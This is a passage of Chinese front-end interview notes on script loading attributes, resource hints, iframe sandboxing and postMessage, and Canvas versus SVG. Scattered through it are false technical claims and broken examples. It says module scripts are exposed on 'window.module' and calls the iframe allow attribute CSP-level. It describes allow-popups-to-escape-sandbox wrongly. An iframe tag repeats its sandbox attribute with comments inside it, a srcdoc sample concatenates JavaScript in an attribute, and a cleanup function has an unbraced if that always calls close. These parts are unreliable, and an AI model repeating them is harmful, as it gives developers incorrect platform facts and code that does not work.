<script defer src="main.js"></script>
```

---

## 6.8 常见陷阱

### 陷阱 1：async 脚本中直接访问 DOM 可能失败

```html
<script async src="app.js"></script>
<script>
  // ❌ 错误：async 脚本可能在 DOM 解析完成前执行
  const btn = document.getElementById('btn'); // null！
</script>

<script defer src="app.js"></script>
<script>
  // ✅ 正确：defer 保证 DOM 解析完成后才执行
  const btn = document.getElementById('btn'); // 必定存在
</script>
```

### 陷阱 2：多个 async 脚本假设顺序执行

```html
<script async src="vue.js"></script>
<script async src="my-plugin.js"></script>
<!-- my-plugin.js 依赖 vue.js，但如果 vue.js 下载更慢， -->
<!-- my-plugin.js 会先执行，报错：Vue is not defined -->
```

### 陷阱 3：模块脚本（type="module"）默认 defer，但不支持 nomodule

```html
<!-- module 脚本默认 defer，但无 polyfill 回退机制 -->
<script type="module" src="app.mjs"></script>
<!-- 旧浏览器不认识 module，旧 JS 不会执行 -->

<!-- 正确做法：module + nomodule 双版本 -->
<script type="module" src="app.mjs"></script>
<script nomodule src="legacy-app.js" defer></script>
```

---

## 6.9 面试追问

### Q1：defer 脚本和 DOMContentLoaded 事件的执行顺序是什么？

**答**：**所有 defer 脚本在 DOMContentLoaded 事件触发之前执行**，且按文档顺序执行。时序：

1. HTML 解析器解析 HTML
2. 遇到 defer 脚本 → 并行下载，不阻塞解析
3. HTML 解析完毕（DOM 完全构建）
4. **defer 脚本按顺序执行**
5. DOMContentLoaded 事件触发
6. 后续同步任务（如 `DOMContentLoaded` 回调）执行

```javascript
// DOMContentLoaded 回调在 defer scripts 之后才运行
document.addEventListener('DOMContentLoaded', () => {
  // 此时所有 defer script 已执行完毕
});
```

---

### Q2：给所有 script 都加 defer 有什么潜在问题？

**答**：主要问题是**执行时机延迟**：

1. **依赖立即执行的脚本**会失效（如老旧的 `document.write` 注入、无模块系统的全局变量初始化）
2. **首屏交互延迟**：用户可见页面但点击无响应，因为 defer 脚本还没执行（用户会感知"页面卡顿"）
3. **破坏需要 early execution 的逻辑**：如需要尽早读取 `window.pluginAPI` 的第三方集成代码

最佳做法是分析依赖关系，按需分层：
- **关键路径（阻塞首屏交互）**：内联少量同步脚本
- **框架/核心逻辑**：defer
- **统计/监控**：async（不需要等 DOM）
- **按需加载**：dynamic import

---

### Q3：模块脚本（type="module"）和 defer 一起使用会怎样？

**答**：**模块脚本默认就是 defer 行为**，两者语义重复：

```html
<!-- 完全等效 -->
<script type="module" src="app.mjs"></script>
<script type="module" defer src="app.mjs"></script>

<!-- 等效原因：ES Module spec 规定模块延迟执行 -->
```

区别在于：`type="module"` 会：
- 默认请求 CORS（需要 `crossorigin` 属性配合）
- 在 `window.module` 中暴露为模块（而非普通脚本）
- 有独立的模块级作用域（不污染全局）
- 支持 `import.meta` 对象

`defer` 则没有这些特性。所以实际开发中，如果用 `type="module"`，**不需要再加 defer**。

---

## 6.10 总结表

| 特性 | 无属性（sync） | `async` | `defer` |
|------|--------------|--------|--------|
| 下载阻塞解析器？ | 是（暂停） | 否（并行） | 否（并行） |
| 执行阻塞解析器？ | 是 | 是（执行时阻塞） | 否（DOM 已就绪） |
| 执行顺序 | 文档顺序 | 乱序（谁先下完谁执行） | 文档顺序 |
| DOMContentLoaded 之前执行？ | 是（会延迟 DCL） | 否（可能在 DCL 前后） | 是（执行完才触发 DCL） |
| 适合场景 | 需要 early run 的脚本 | 独立第三方脚本 | 有依赖关系的脚本 |
| 渲染阻塞 | 严重 | 中等 | 最小 |

> 📚 参考：
> - https://segmentfault.com/a/1190000045432965
> - https://juejin.cn/post/6844904197423382535
> - https://blog.csdn.net/canjava/article/details/140057832
> - https://blog.csdn.net/weixin_45092437/article/details/129752333

---

### 7. preload/prefetch/preconnect 区别

#### 7.1 定义与核心原理

这三个指令都是浏览器**资源提示（Resource Hints）**，用于在浏览器自然发现资源之前**提前告知浏览器**即将需要的资源，从而减少等待时间。

**关键区别：**

| 指令 | 连接 | 下载资源 | 优先级 | 执行时机 |
|------|------|---------|--------|---------|
| `dns-prefetch` | ✅ 仅 DNS | ❌ | 中 | 立即 DNS 解析 |
| `preconnect` | ✅ DNS + TCP + TLS | ❌ | 高 | 立即建立连接 |
| `preload` | ✅（复用已有） | ✅ **立即下载** | **High** | 解析到 link 时立即下载 |
| `prefetch` | ✅（复用已有） | ✅ **空闲时下载** | **Lowest** | 网络空闲时下载 |
| `modulepreload` | ✅ | ✅ 立即下载模块 | High | 立即下载 ESM 模块 |

#### 7.2 详细工作原理

**dns-prefetch：** 仅解析 DNS，不建立 TCP 连接。
```html
<!-- 老旧浏览器不支持 preconnect 时的降级方案 -->
<link rel="dns-prefetch" href="//cdn.example.com">
```

**preconnect：** DNS + TCP 握手 + TLS 握手全部提前完成（以 Google Fonts 为例）：
```
无 preconnect：
  → DNS(50ms) → TCP(50ms) → TLS(100ms) → 请求(200ms)
  总计：~400ms

有 preconnect：
  → preconnect 完成 DNS+TCP+TLS（~200ms，并行）
  → 实际请求：~200ms
  总计：~200ms（节省约 50%）
```

**preload 的"延迟执行"机制：**
```html
<!-- 浏览器在解析到 link 时立即下载，但不阻塞解析 -->
<link rel="preload" href="/api/user" as="fetch" crossorigin>

<!-- 脚本中真正需要时才执行请求（此时资源已在缓存中） -->
<script>
  // 此时 /api/user 早已下载好，直接使用
  const res = await fetch('/api/user');
</script>
```

**`as` 属性的关键作用（缺少 as 会导致错误加载）：**

| as 值 | 触发效果 |
|-------|---------|
| `as="font"` | 正确缓存；正确 CORS；正确优先级；必须加 `crossorigin` |
| `as="image"` | 正确优先级；正确缓存 |
| `as="script"` | 正确优先级；避免重复执行 |
| `as="style"` | 正确优先级；正确加载 CSS |
| `as="fetch"` | 正确优先级（High）；正确 CORS |
| `as="video"`/`as="audio"` | 正确优先级 |

> ⚠️ **最常见错误：** 预加载字体时不加 `crossorigin`，导致 CORS 失败，字体下载后被丢弃：
> ```html
> <!-- ❌ 错误：缺 crossorigin，字体被 CORS 拦截并丢弃 -->
> <link rel="preload" href="/fonts/Lato.woff2" as="font">
> <!-- ✅ 正确 -->
> <link rel="preload" href="/fonts/Lato.woff2" as="font" crossorigin>
> ```

#### 7.3 完整代码示例

```html
<head>
  <!-- 1. 预连接即将请求的第三方域名（节省 ~200ms） -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

  <!-- 2. 预加载首屏关键资源（当前页面必需，优先加载） -->
  <!-- LCP 图片（最大内容绘制） -->
  <link rel="preload" href="/hero.webp" as="image" fetchpriority="high">
  <!-- 字体文件（防止 FOIT） -->
  <link rel="preload" href="/fonts/Lato.woff2" as="font" crossorigin type="font/woff2">
  <!-- 关键 CSS（首屏渲染必需） -->
  <link rel="preload" href="/critical.css" as="style">
  <!-- 入口脚本（依赖 DOM 的模块） -->
  <link rel="preload" href="/main.js" as="script">

  <!-- 3. 预取下一个导航的资源（空闲时加载，不影响当前页面） -->
  <link rel="prefetch" href="/about.js" as="script">
  <link rel="prefetch" href="/api/recommendations" as="fetch">

  <!-- 4. ES Module 预加载（比 prefetch 更精确） -->
  <link rel="modulepreload" href="/utils/format.js">
</head>
```

#### 7.4 preload vs prefetch 场景对照表

| 场景 | 推荐 | 原因 |
|------|------|------|
| 首屏大图（LCP） | `preload` as="image" | 延迟加载会严重影响 LCP 分数 |
| 入口 JS 模块 | `preload` as="script" | 高优先级，立即下载，解析后执行 |
| 首屏字体 | `preload` as="font" crossorigin | 避免 FOIT（文字不可见闪烁） |
| 下一页面需要的资源 | `prefetch` | 网络空闲时下载，不抢当前页面带宽 |
| Google Maps SDK / 分析脚本 | `preconnect` | 即将使用但不确定具体资源，先建连接 |
| JS 动态引入的脚本 | 动态 `import()`（代码分割） | 比 preload 更精确地控制时机 |

#### 7.5 常见坑点与最佳实践

| 坑点 | 说明 | 解决方案 |
|------|------|----------|
| **preload 后重复请求** | 同一资源被 preload 后，脚本中又 fetch/import，导致两次请求 | preload 仅用于后续不会自动发现的资源 |
| **字体缺 crossorigin** | 字体 CORS 失败，被浏览器丢弃 | 所有字体 preload 必须加 `crossorigin` |
| **prefetch 被 CSP 拦截** | Content-Security-Policy 可能阻止 prefetch | CSP 中声明允许的连接域 |
| **as 错误导致降级** | as 属性缺失或错误，浏览器降级为低优先级 | 严格匹配资源类型 |
| **prefetch 滥用** | prefetch 过多反而浪费带宽，影响当前页面加载 | 仅 prefetch 下一个确定会访问的页面 |

**Chrome DevTools 验证：**
- Network 面板中，preload 资源显示为 `preload` 类型（橙色）
- prefetch 资源显示为 `prefetch` 类型（灰色，`High` 优先级请求在末尾）
- 检查是否有 `preload-missing` 警告（说明 preload 了但未实际使用）

#### 7.6 高频面试追问

**Q1：preload 了资源后，浏览器会重复请求吗？缓存策略是什么？**
> 不会重复请求。preload 将资源放入内存缓存（HTTP 缓存取决于 Cache-Control）。后续 `fetch()` 或 `import()` 找到缓存中的资源直接使用。但需注意：**preload 的 `as` 必须匹配实际请求类型**，否则会降级或被忽略。

**Q2：同时设置 `rel="preload"` 和 `rel="prefetch"` 同一个资源，会产生两次请求吗？**
> 不会。浏览器会对同一 URL 进行去重处理。但执行时机取决于优先级——preload 立即执行，prefetch 在空闲时执行。

**Q3：`modulepreload` 和 `preload as="script"` 在加载 ES Module 时有什么区别？**
> `modulepreload` 会：① 预解析模块文件；② 预解析依赖图（import 的子模块）；③ 预建立 CORS 连接。而 `preload as="script"` 仅下载主模块，不处理依赖图。大型 ESM 应用（Next.js/Nuxt）中 `modulepreload` 可显著减少首屏模块解析时间。

> 📚 参考：
> - [web.dev — Preload, prefetch and priorities](https://web.dev/articles/preload-prefetch-and-priorities)
> - [MDN — Link prefetching FAQ](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types/prefetch)
> - [MDN — modulepreload](https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types/modulepreload)

---

# Section 8: iframe 问题与通信

## 8.1 iframe 基础回顾

iframe（Inline Frame）是在当前 HTML 页面内嵌入另一个独立 HTML 页面的元素：

```html
<iframe src="https://example.com/page" width="800" height="600"></iframe>
```

虽然现代 Web 开发中 SPA（单页应用）减少了 iframe 的使用，但在以下场景 iframe 仍有价值：

- 第三方内容隔离嵌入（广告、视频、支付组件）
- 微前端架构中的子应用隔离
- 跨域内容展示（如跨域文档预览）
- 沙箱执行（代码编辑器、预览面板）

---

## 8.2 安全问题详解

### 8.2.1 sandbox 属性 — 沙箱隔离

`sandbox` 属性对 iframe 内的内容施加一系列安全限制。没有值时应用所有限制，也可以用空格分隔的值列表来精确控制。

```html
<!-- 最严格：应用所有限制，无法运行脚本、提交表单、访问父页面 -->
<iframe sandbox src="untrusted.html"></iframe>

<!-- 逐步开放限制 -->
<iframe sandbox="allow-scripts"       <!-- 允许执行 JS -->
        sandbox="allow-scripts allow-same-origin"  <!-- 允许 JS + 同源访问 -->
        sandbox="allow-scripts allow-same-origin allow-forms" <!-- + 表单提交 -->
        sandbox="allow-scripts allow-top-navigation-by-user-activation"
        src="semi-trusted.html"></iframe>
```

#### sandbox 权限标记完整列表

| 值 | 作用 |
|----|------|
| `allow-downloads` | 允许下载（需用户主动触发） |
| `allow-forms` | 允许提交表单 |
| `allow-modals` | 允许 `alert()`、`confirm()`、`prompt()` |
| `allow-orientation-lock` | 允许锁定屏幕方向 |
| `allow-pointer-lock` | 允许指针锁定（游戏等） |
| `allow-popups` | 允许 `window.open()`、弹窗 |
| `allow-popups-to-escape-sandbox` | 允许弹窗访问父页面（需同 sandbox 标记） |
| `allow-presentation` | 允许演示模式 |
| `allow-same-origin` | 将内容视为同源（**会削弱 sandbox**） |
| `allow-scripts` | 允许执行 JavaScript |
| `allow-storage-access-by-user-activation` | 允许 Storage Access API |
| `allow-top-navigation` | 允许导航顶层窗口 |
| `allow-top-navigation-by-user-activation` | 仅在用户触发时允许导航 |
| `allow-top-navigation-to-custom-protocols` | 允许调用自定义协议（`app://`） |

#### 安全建议

```html
<!-- ✅ 最安全：只允许内容和样式展示，关闭所有脚本和表单 -->
<iframe sandbox src="embed-content.html"></iframe>

<!-- ⚠️ 谨慎：如果 iframe 内需要同源能力 -->
<!-- 注意：allow-same-origin 配合 allow-scripts 会让 iframe 获得完全权限 -->
<iframe sandbox="allow-scripts allow-same-origin"
         src="sandbox-app.html"></iframe>
```

**最佳实践**：始终包含 `sandbox` 属性，从最严格开始，按需逐步添加权限。

### 8.2.2 allow 属性 — 功能策略（Permissions Policy）

`allow` 是 CSP（Content Security Policy）级别的控制，比 `sandbox` 更细粒度地控制 iframe 可以使用的浏览器特性：

```html
<!-- 限制 iframe 只能使用摄像头和麦克风，禁止地理位置 -->
<iframe src="video-call.html"
        allow="camera; microphone; geolocation 'none'"
        sandbox="allow-scripts"></iframe>

<!-- 更多示例 -->
<iframe allow="payment 'self'"           src="payment.html"></iframe>
<iframe allow="fullscreen"                src="presentation.html"></iframe>
<iframe allow="clipboard-read; clipboard-write" src="editor.html"></iframe>
```

| 策略值 | 控制能力 |
|--------|---------|
| `camera` / `microphone` | 媒体设备 |
| `geolocation` | 地理位置 |
| `payment` | Payment API |
| `fullscreen` | 全屏 API |
| `clipboard-read` / `clipboard-write` | 剪贴板读写 |
| `display-capture` | 屏幕捕获 |
| `web-share` | Web Share API |
| `xr-spatial-tracking` | WebXR |

---

## 8.3 postMessage API — 跨窗口安全通信

`window.postMessage()` 是唯一安全的跨域通信方式，它绕过了同源策略（SOP）的限制。

### 8.3.1 基础 API

```typescript
// 发送消息
otherWindow.postMessage(message: any, targetOrigin: string, transfer?: Transferable[])

// 接收消息
window.addEventListener('message', (event: MessageEvent) => {
  // event.source — 发送方的 window 代理
  // event.origin — 发送时的源（protocol + host + port）
  // event.data   — 消息内容
});
```

### 8.3.2 父页面 → iframe 通信

```typescript
// 父页面
const iframe = document.getElementById('child-frame') as HTMLIFrameElement;

// 等待 iframe 加载完成（onload 后才能安全发送消息）
iframe.onload = () => {
  iframe.contentWindow?.postMessage(
    { type: 'AUTH_TOKEN', token: 'eyJhbGci...' },
    'https://trusted-subdomain.example.com'  // ✅ 精确指定目标源
  );
};

// ❌ 错误：targetOrigin 设为 '*' 在生产环境是安全风险
// iframe.contentWindow?.postMessage(data, '*');
```

```typescript
// iframe 内部：验证 origin 并处理消息
window.addEventListener('message', (event: MessageEvent) => {
  // ✅ 第一步：验证来源（绝对必要！）
  const ALLOWED_ORIGINS = [
    'https://parent.example.com',
    'https://staging.example.com',
  ];

  if (!ALLOWED_ORIGINS.includes(event.origin)) {
    console.warn(`Rejected message from unauthorized origin: ${event.origin}`);
    return; // 不处理不信任来源的消息
  }

  // ✅ 第二步：处理消息
  const { type, token } = event.data;

  switch (type) {
    case 'AUTH_TOKEN':
      // 安全地使用 token
      localStorage.setItem('auth_token', token);
      break;
    case 'NAVIGATE':
      // 安全地执行导航
      if (typeof event.data.path === 'string') {
        history.pushState(null, '', event.data.path);
      }
      break;
    default:
      console.warn(`Unknown message type: ${type}`);
  }
});
```

### 8.3.3 iframe → 父页面通信

```typescript
// iframe 内发送消息
window.parent.postMessage(
  { type: 'READY', payload: { userId: 12345 } },
  'https://parent.example.com'
);

// 父页面接收
window.addEventListener('message', (event) => {
  if (event.origin !== 'https://iframe.example.com') return;

  if (event.data.type === 'READY') {
    console.log('Child iframe ready, user:', event.data.payload.userId);
  }
});
```

### 8.3.4 Origin 验证的完整模式

```typescript
// 工具函数：安全的消息处理
type MessageHandler = (data: unknown, origin: string, source: Window) => void;

function createMessageChannel(
  allowedOrigins: string[],
  handler: MessageHandler
) {
  window.addEventListener('message', (event) => {
    // 严格校验 origin
    if (!allowedOrigins.includes(event.origin)) {
      return;
    }

    // 校验 source（防止通过 window.frames[n] 伪造来源）
    try {
      if (event.source !== window.frames[event.data.__frameId__]) {
        return;
      }
    } catch (_) {
      // cross-origin 无法访问 source，但 event.origin 已经保护
    }

    handler(event.data, event.origin, event.source);
  });
}

// TypeScript 类型安全的消息格式
interface CrossFrameMessage {
  type: string;
  payload: unknown;
  __frameId__?: string;
  __timestamp__?: number;
}
```

---

## 8.4 iframe 加载时机问题

### 8.4.1 onload vs load 事件

```html
<!-- 两种监听方式：HTML 属性（不推荐） -->
<iframe src="page.html" onload="iframeLoaded()"></iframe>

<!-- JS 属性绑定（推荐） -->
<iframe id="myframe" src="page.html"></iframe>
```

```typescript
// ❌ 错误：在未加载完成时发送消息
const iframe = document.getElementById('myframe') as HTMLIFrameElement;
iframe.contentWindow?.postMessage(data, origin); // iframe 未就绪，消息可能丢失

// ✅ 正确：等待 onload 后再通信
const iframe = document.getElementById('myframe') as HTMLIFrameElement;
iframe.addEventListener('load', () => {
  iframe.contentWindow?.postMessage({ type: 'INIT' }, origin);
});
```

### 8.4.2 onload 触发时机说明

```
iframe.onload 触发条件：
  ✅ iframe 的完整页面（包括所有子资源：CSS/JS/图片）加载完毕
  ✅ 同源：window.onload 相同
  ⚠️ 跨域：无法访问 document，但 onload 仍会触发
  ❌ 如果 src 指向一个长时间加载的资源，onload 也会等待
  ❌ 如果 iframe 内 JS 执行 endless loop，onload 永不触发
```

### 8.4.3 更精细的加载状态检测

```typescript
// 跨域场景：无法访问 iframe.contentDocument
// 使用 contentWindow.document.body 检测（需同源）
function waitForIframeContent(iframe: HTMLIFrameElement): Promise<void> {
  return new Promise((resolve) => {
    iframe.addEventListener('load', () => {
      try {
        // 同源检查：能访问 body 说明可以深入检测
        const doc = iframe.contentDocument || iframe.contentWindow?.document;
        if (doc?.body?.childNodes.length > 0) {
          resolve();
        } else {
          // 内容可能还在渲染，等待 DOMContentLoaded
          const innerDoc = iframe.contentWindow?.document;
          innerDoc?.addEventListener('DOMContentLoaded', resolve);
        }
      } catch (_) {
        // 跨域，无法深入检测，使用 load 事件
        resolve();
      }
    });
  });
}
```

---

## 8.5 内存与性能问题

### 8.5.1 iframe 内存开销

每个 iframe 都是一个独立的**浏览上下文**（Browsing Context），会：

- 创建独立的 **JS 堆**（JavaScript heap）
- 创建独立的 **CSSOM / DOM**
- 消耗主进程的内存（多个 iframe = 多倍内存占用）
- 独立的事件循环（但共享主线程渲染）

```typescript
// 监控 iframe 内存（Chrome DevTools）
// Performance.measureUserAgentSpecificMemory() (Chrome 89+)

// 主动释放 iframe（减少内存占用）
function destroyIframe(iframe: HTMLIFrameElement) {
  // 清除内容
  iframe.src = 'about:blank';
  // 移除元素
  iframe.remove();
}

// ⚠️ 注意事项：
// - 移除 iframe 前设置 src 为空白页，防止内存泄漏
// - 复杂的 SPA iframe 可能需要显式调用 cleanup 函数
```

### 8.5.2 性能优化策略

```html
<!-- 1. 懒加载：不进入视口时不加载 iframe -->
<iframe src="heavy-page.html" loading="lazy"></iframe>

<!-- 等效的 JS 实现（兼容不支持 loading="lazy" 的浏览器） -->
<iframe src="heavy-page.html" loading="lazy" 
         style="border:none;width:1px;height:1px;opacity:0;"
         class="lazy-iframe"></iframe>

<!-- IntersectionObserver 实现懒加载 -->
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      const iframe = entry.target as HTMLIFrameElement;
      iframe.src = iframe.dataset.src!;  // 用 data-src 存真实 URL
      observer.unobserve(iframe);
    }
  });
});
document.querySelectorAll('iframe[data-src]').forEach(iframe => {
  observer.observe(iframe);
});
```

```html
<!-- 2. 预连接（减少 iframe 连接时间） -->
<link rel="preconnect" href="https://embed.example.com" crossorigin />

<!-- 3. 设置宽高避免布局抖动（CLS 优化） -->
<iframe src="widget.html"
        width="400"
        height="300"
        style="border:none; display:block;"
        title="Embedded Widget">
</iframe>
```

### 8.5.3 iframe 与 Core Web Vitals

| 指标 | iframe 影响 | 缓解方法 |
|------|----------|---------|
| LCP | iframe 内图片可能成为 LCP 元素 | 预加载 iframe 内容，或用 `loading="eager"` |
| FID/INP | 重的 iframe JS 影响主线程 | 使用 `sandbox="allow-scripts"` 隔离，不共享主线程（其实还是共享） |
| CLS | iframe 无高度时页面跳动 | 始终设定 `width`/`height` 或 `aspect-ratio` |

---

## 8.6 srcdoc 属性

`srcdoc` 直接在 HTML 中嵌入完整的 HTML 文档内容，替代通过 `src` 加载外部 URL：

```html
<!-- 等效于 src="data:text/html,..."，但更可读 -->
<iframe srcdoc='
  <!DOCTYPE html>
  <html>
    <head><style>body{background:#f0f0f0}</style></head>
    <body>
      <h1>Hello from srcdoc</h1>
      <script>console.log("embedded script running");</script>
    </body>
  </html>
'></iframe>
```

### 使用场景

```html
<!-- 1. 嵌入动态生成的内容（不需要单独的 HTML 文件） -->
<iframe srcdoc='
  <div style="padding:20px">
    <h2>Report: Q3 2025</h2>
    <p>Generated at: ' + new Date().toISOString() + '</p>
  </div>
'></iframe>

<!-- 2. 预览组件（编辑器的实时预览） -->
<iframe srcdoc="<%= previewHTML %>" id="preview-frame"></iframe>

<!-- 3. 配合 sandbox 嵌入安全内容 -->
<iframe srcdoc='
  <script>
    // 安全的沙箱预览，不加载外部资源
    document.body.innerHTML = "<p>Preview content</p>";
  </script>
' sandbox="allow-scripts"></iframe>
```

### srcdoc vs src 对比

| 特性 | `src` | `srcdoc` |
|------|-------|---------|
| 内容来源 | 外部 URL | 内联 HTML 字符串 |
| 发起网络请求 | 是（加载外部页面） | 否（纯前端） |
| 支持 CSP | 继承父页面 CSP | 可独立设置 |
| 跨域能力 | 支持 | 无外部请求 |
| JavaScript | 正常执行 | 正常执行 |
| 兼容 IE | 支持 | 不支持（IE 无 srcdoc） |
| 安全 | 依赖外部内容安全性 | 更可控（配合 sandbox） |

---

## 8.7 React + TypeScript 中使用 iframe

```tsx
// IframeMessageBus.tsx — 类型安全的 iframe 通信 Hook
import { useEffect, useRef, useCallback } from 'react';

interface MessagePayload {
  type: string;
  data?: unknown;
}

interface UseIframeMessageOptions {
  targetOrigin: string;
  allowedOrigins: string[];
}

export function useIframeMessage(
  iframeRef: React.RefObject<HTMLIFrameElement>,
  { targetOrigin, allowedOrigins }: UseIframeMessageOptions
) {
  const postMessage = useCallback((payload: MessagePayload) => {
    const iframe = iframeRef.current;
    if (!iframe?.contentWindow) return;
    iframe.contentWindow.postMessage(payload, targetOrigin);
  }, [iframeRef, targetOrigin]);

  useEffect(() => {
    const handler = (event: MessageEvent) => {
      if (!allowedOrigins.includes(event.origin)) return;

      // 处理消息，更新 React 状态
      console.log('[iframe→parent]', event.data);
    };

    window.addEventListener('message', handler);
    return () => window.removeEventListener('message', handler);
  }, [allowedOrigins]);

  return { postMessage };
}

// 使用示例
function ParentComponent() {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const { postMessage } = useIframeMessage(iframeRef, {
    targetOrigin: 'https://child.example.com',
    allowedOrigins: ['https://child.example.com'],
  });

  return (
    <>
      <iframe
        ref={iframeRef}
        src="https://child.example.com/app"
        title="Child App"
        width="800"
        height="600"
        sandbox="allow-scripts allow-same-origin"
        onLoad={() => {
          // iframe 就绪后，发送初始化数据
          postMessage({ type: 'INIT', data: { userId: 42 } });
        }}
      />
      <button onClick={() => postMessage({ type: 'UPDATE', data: {} })}>
        Update Child
      </button>
    </>
  );
}
```

---

## 8.8 面试追问

### Q1：iframe 的 sandbox 属性中 `allow-same-origin` 有什么风险？

**答**：`allow-same-origin` 会将 iframe 内容视为与父页面同源。这意味着：

1. **绕过跨域限制**：iframe 内的 JS 可以通过 `parent.window` 访问父页面的 DOM（如果父页面没有设置 `sandbox` 防御的话）
2. **共享 Cookie**：如果父页面和 iframe 来自同一域（或子域），`allow-same-origin` 让 iframe 可以读写父页面的 Cookie
3. **storage 访问**：iframe 可以访问 `localStorage`/`sessionStorage` 中父页面的数据

```html
<!-- 高危组合：allow-same-origin + allow-scripts 让 iframe 几乎等同于父页面 -->
<iframe sandbox="allow-same-origin allow-scripts" src="malicious.html">
</iframe>
<!-- 如果 src 是同域恶意页面，它可以：
   - 读取父页面的 localStorage（敏感 token）
   - 访问父页面的 DOM（keylogger）
   - 向外发送数据（数据泄露）
-->
```

**安全做法**：
- 如果 iframe 内容不需要同源访问，**不要加 `allow-same-origin`**
- 如果必须同源（需要共享数据），配合 CSP 的 `child-src` 和 `frame-src` 限制来源
- 始终限制 `allow-scripts`，按需加上 `allow-same-origin`

---

### Q2：postMessage 的 origin 参数设为 `*` 有什么问题？

**答**：

**`targetOrigin: '*'` 的问题**：

```typescript
// ❌ 不安全：消息会发送给任何窗口
iframe.contentWindow?.postMessage(data, '*');

// 攻击场景：
// 1. 页面被嵌入到恶意第三方网站
// 2. 恶意网站劫持消息（即使无法读懂内容，可能触发副作用）
// 3. 消息内容可能是认证 token，被中间人拿走
```

**正确做法**：

```typescript
// ✅ 安全：精确指定目标 origin
iframe.contentWindow?.postMessage(data, 'https://trusted-app.example.com');

// ✅ 备选：检查消息后发送（动态 origin）
function sendWithOrigin(targetWindow: Window, data: unknown, origin: string) {
  // 先验证窗口确实是预期的 origin
  const expected = 'https://expected.example.com';
  if (origin !== expected) return;
  targetWindow.postMessage(data, expected);
}
```

接收方也必须验证 `event.origin`：

```typescript
window.addEventListener('message', (event) => {
  // ✅ 必须在处理任何数据前验证 origin
  if (event.origin !== 'https://parent.example.com') return;

  // 安全处理 event.data
});
```

---

### Q3：iframe 对页面性能的影响，如何优化？

**答**：主要问题和优化策略：

**内存问题**：
- 每个 iframe 创建一个独立的 JS 上下文，开销约 2-5MB+
- 不使用的 iframe 应当移除并设为 `src="about:blank"` 再 remove

```typescript
// 清理 iframe
function cleanupIframe(iframe: HTMLIFrameElement) {
  iframe.src = 'about:blank';
  // 清空内容，加速内存释放
  const doc = iframe.contentDocument;
  if (doc) doc.open(); doc.close();
  iframe.remove();
}
```

**加载阻塞问题**：
- iframe 是独立资源，会和主页面竞争带宽和 TCP 连接
- 使用 `loading="lazy"` 让视口外的 iframe 延迟加载
- 对关键 iframe 提前用 `prefetch` 预加载

```html
<!-- 关键 iframe（用户可见区域）用 eager -->
<iframe src="critical-widget.html" loading="eager" fetchpriority="high"></iframe>

<!-- 非关键 iframe 用 lazy -->
<iframe src="analytics-dashboard.html" loading="lazy"></iframe>
```

**CLS 问题**：
- iframe 没有设定宽高会导致布局偏移
- 始终在 iframe 上设置 `width` 和 `height`（或 `aspect-ratio`）
- 使用 CSS `contain` 属性隔离重排/重绘影响

```html
<iframe src="widget.html"
        width="400" height="300"
        style="aspect-ratio: 4/3; border:none; display:block;"
        title="Widget"></iframe>
```

**渲染层问题**：
- iframe 创建新的 **浏览上下文**，与父页面共享主线程
- 重 iframe 的 JS 计算会抢占主线程，影响 INP（Interaction to Next Paint）
- 使用 `sandbox` 隔离并限制功能，防止 iframe 内 JS 过度消耗

---

### Q4：如何检测 iframe 是否加载成功或加载失败？

```typescript
function setupIframeTracking(iframe: HTMLIFrameElement): Promise<void> {
  return new Promise((resolve, reject) => {
    iframe.addEventListener('load', resolve);

    // 网络层面错误（跨域时无法区分具体错误类型）
    iframe.addEventListener('error', () => {
      reject(new Error(`Iframe failed to load: ${iframe.src}`));
    });

    // 跨域时无法访问 contentWindow，但可以用 timeout 兜底
    const timeoutId = setTimeout(() => {
      reject(new Error('Iframe load timeout (>10s)'));
    }, 10000);

    iframe.addEventListener('load', () => clearTimeout(timeoutId));
  });
}
```

---

## 8.9 总结表：iframe 安全属性

| 属性 | 作用 | 推荐值 |
|------|------|--------|
| `sandbox` | 沙箱隔离 | 从空开始，逐步加权限 |
| `allow` | 功能策略 | 按需精确列出 |
| `referrerpolicy` | 请求来源头 | `no-referrer` / `same-origin` |
| `csp` | iframe 内 CSP | `frame-src 'self'` |
| `loading` | 懒加载 | `lazy`（非关键）或 `eager`（关键） |

> 📚 参考：
> - https://blog.csdn.net/weixin_42845571/article/details/118335177
> - https://blog.csdn.net/m0_51429350/article/details/147372919
> - https://www.cnblogs.com/excellent-vb/archive/2004/01/13/15860501.html
> - https://www.cnblogs.com/acttan/p/16498360.html

---

### 9. Canvas vs SVG 区别

#### 9.1 定义与核心原理

| 技术 | 核心定义 | 渲染模型 |
|------|---------|---------|
| **Canvas** | 通过 JavaScript 在位图画布上逐**像素**绑制图形的 HTML5 API |  Immediate Mode（立即模式）：绑定后像素进入显存，丢失绘图命令 |
| **SVG** | 用 XML 语言描述**矢量图形**，由浏览器渲染引擎解析并绘制为矢量 | Retained Mode（保留模式）：每个图形是 DOM 节点，浏览器维护对象树 |

**根本区别：**
```
Canvas：Pixels in → Bitmap in GPU memory（绑定后无法单独修改某个像素）
SVG：DOM Node Tree → Render Engine → Vector Pixels（每个节点独立，可单独修改）
```

#### 9.2 性能边界（面试高频）

**Canvas 优势区间（什么时候选 Canvas）：**

| 条件 | Canvas 表现 | SVG 表现 |
|------|------------|---------|
| 图形数量 > **1000** | ✅ 60fps 流畅 | ❌ 严重卡顿（DOM 节点过多） |
| 高频更新（**>30fps**） | ✅ 直接重绘帧缓冲区 | ❌ 频繁 DOM 更新 + 重排 |
| 像素级操作（滤镜/像素抓取） | ✅ 原生支持 getImageData | ❌ 难以实现 |
| 游戏（帧同步） | ✅ requestAnimationFrame 驱动 | ❌ 不适合 |
| 图表/数据可视化（实时数据） | ✅ 大数据量渲染 | ⚠️ 数据点 <500 可行 |

**SVG 优势区间（什么时候选 SVG）：**

| 条件 | SVG 表现 | Canvas 表现 |
|------|---------|------------|
| 图形数量 < **500** | ✅ 流畅 | ⚠️ 也可以 |
| 需要交互（点击/悬停） | ✅ 天然 DOM 事件 | ❌ 需手动坐标检测 |
| 需要 CSS 样式控制 | ✅ 直接用 CSS | ❌ 需重新绑定 |
| 需要导出矢量文件 | ✅ 原生 SVG | ❌ 需 toDataURL 转换 |
| 响应式（不同尺寸清晰） | ✅ 矢量，放大不失真 | ❌ 依赖分辨率 |
| 图标/UI 组件 | ✅ 最佳选择 | ❌ 过度设计 |

**经验公式：**
